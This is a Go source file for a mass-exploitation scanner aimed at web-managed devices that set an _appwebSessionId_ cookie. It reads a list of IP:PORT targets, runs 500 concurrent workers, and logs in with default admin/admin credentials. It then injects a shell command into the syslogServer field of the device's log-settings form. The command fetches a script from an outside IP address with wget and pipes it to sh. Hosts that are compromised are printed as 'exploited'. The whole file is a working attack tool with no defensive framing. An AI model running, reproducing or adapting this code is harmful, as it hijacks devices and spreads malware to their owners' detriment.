package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"sync"
	"time"
  "net"
)

var (
	maxGoroutines = 500
	wg            sync.WaitGroup
	mu            sync.Mutex
)

func main() {
	// Read IP:PORT from ips.txt
	ips, err := readIPsFromFile("ips.txt")
	if err != nil {
		fmt.Println("Error reading IPs from file:", err)
		return
	}

	semaphore := make(chan struct{}, maxGoroutines)

	for _, ipPort := range ips {
		wg.Add(1)
		go func(ipPort string) {
			defer wg.Done()
			semaphore <- struct{}{} 
			processIP(ipPort)
			<-semaphore 
		}(ipPort)
	}

	wg.Wait()
	close(semaphore)
}

func processIP(ipPort string) {
	defer func() {
		mu.Lock()
		defer mu.Unlock()
	}()

	url := "http://" + ipPort + "/"
	request, err := http.NewRequest("GET", url, nil)
	if err != nil {
		//fmt.Printf("Error creating request for %s: %v\n", ipPort, err)
		return
	}

	client := http.Client{Timeout: 15 * time.Second} 
	response, err := client.Do(request)
	if err != nil {

		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			//fmt.Printf("Timeout for %s: %v\n", ipPort, err)
			return
		}
		//fmt.Printf("Error sending request for %s: %v\n", ipPort, err)
		return
	}
	defer response.Body.Close()

	var appwebSessionID string
	for _, values := range response.Header["Set-Cookie"] {
		if strings.Contains(values, "_appwebSessionId_") {
			appwebSessionID = extractCookieValue(values)
		}
	}

	postURL := "http://" + ipPort + "/"
	postData := "src_page=&username=admin&password=admin"
	postRequest, err := http.NewRequest("POST", postURL, strings.NewReader(postData))
	if err != nil {
		//fmt.Printf("Error creating POST request for %s: %v\n", ipPort, err)
		return
	}

	postRequest.Header.Set("Content-Length", fmt.Sprint(len(postData)))
	postRequest.Header.Set("Host", ipPort)
	postRequest.Header.Set("Cache-Control", "max-age=0")
	postRequest.Header.Set("Upgrade-Insecure-Requests", "1")
	postRequest.Header.Set("Origin", "http://"+ipPort)
	postRequest.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	postRequest.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36")
	postRequest.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	postRequest.Header.Set("Referer", "http://"+ipPort+"/")
	postRequest.Header.Set("Accept-Encoding", "gzip, deflate, br")
	postRequest.Header.Set("Accept-Language", "en-US,en;q=0.9")
	postRequest.Header.Set("Cookie", "_appwebSessionId_="+appwebSessionID+"; language=en")
	postRequest.Header.Set("Connection", "close")

	postResponse, err := client.Do(postRequest)
	if err != nil {
		//fmt.Printf("Error sending POST request for %s: %v\n", ipPort, err)
		return
	}
	defer postResponse.Body.Close()

	body, err := ioutil.ReadAll(postResponse.Body)
	if err != nil {
		//fmt.Printf("Error reading POST response body for %s: %v\n", ipPort, err)
		return
	}
	postResponseBody := string(body)

	if strings.Contains(postResponseBody, "/cgi-bin/ajax.cgi?getProfiles") {
		fmt.Printf("logged in: %s\n", ipPort)
	} else {
		//fmt.Printf("Login failed for: %s\n", ipPort)
		return
	}

	ddnsURL := "http://" + ipPort + "/logsettings.html?server"
	ddnsPostData := "logToFile=0&captureLevel=8&syslogSavetoFile=on&syslogServer=$(wget+http%3a//45.95.146.126/j19+-O-+|sh)"

	ddnsRequest, err := http.NewRequest("POST", ddnsURL, strings.NewReader(ddnsPostData))
	if err != nil {
		//fmt.Printf("Error creating DDNS POST request for %s: %v\n", ipPort, err)
		return
	}

	ddnsRequest.Header.Set("Content-Length", fmt.Sprint(len(ddnsPostData)))
	ddnsRequest.Header.Set("Host", ipPort)
  	ddnsRequest.Header.Set("Cache-Control", "max-age=0")
  	ddnsRequest.Header.Set("Upgrade-Insecure-Requests", "1")
  	ddnsRequest.Header.Set("Origin", "http://"+ipPort)
  	ddnsRequest.Header.Set("Content-Type", "application/x-www-form-urlencoded")
  	ddnsRequest.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
  	ddnsRequest.Header.Set("Referer", "http://"+ipPort+"/logsettings.html")
  	ddnsRequest.Header.Set("Accept-Encoding", "gzip, deflate, br")
  	ddnsRequest.Header.Set("Accept-Language", "en-US,en;q=0.9")
	ddnsRequest.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36")
	ddnsRequest.Header.Set("Cookie", "_appwebSessionId_="+appwebSessionID+"; language=en")
	ddnsRequest.Header.Set("Connection", "close")

	ddnsResponse, err := client.Do(ddnsRequest)
	if err != nil {
		//fmt.Printf("Error sending DDNS POST request for %s: %v\n", ipPort, err)
		return
	}
	defer ddnsResponse.Body.Close()

	ddnsBody, err := ioutil.ReadAll(ddnsResponse.Body)
	if err != nil {
		//fmt.Printf("Error reading DDNS POST response body for %s: %v\n", ipPort, err)
		return
	}

	if strings.Contains(string(ddnsBody), "success") {
		fmt.Printf("exploited: %s\n", ipPort)
	} else {
		//fmt.Printf("DDNS request failed for: %s\n", ipPort)
	}
}

func readIPsFromFile(filename string) ([]string, error) {
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	// Assuming the file contains one IP:PORT per line
	ips := strings.Split(string(content), "\n")
	var cleanedIPs []string
	for _, ip := range ips {
		cleanedIP := strings.TrimSpace(ip)
		if cleanedIP != "" {
			cleanedIPs = append(cleanedIPs, cleanedIP)
		}
	}

	return cleanedIPs, nil
}

func extractCookieValue(setCookieHeader string) string {
	startIndex := strings.Index(setCookieHeader, "_appwebSessionId_=")
	if startIndex == -1 {
		return ""
	}

	startIndex += len("_appwebSessionId_=")
	endIndex := strings.Index(setCookieHeader[startIndex:], ";")
	if endIndex == -1 {
		return setCookieHeader[startIndex:]
	}

	return setCookieHeader[startIndex : startIndex+endIndex]
}
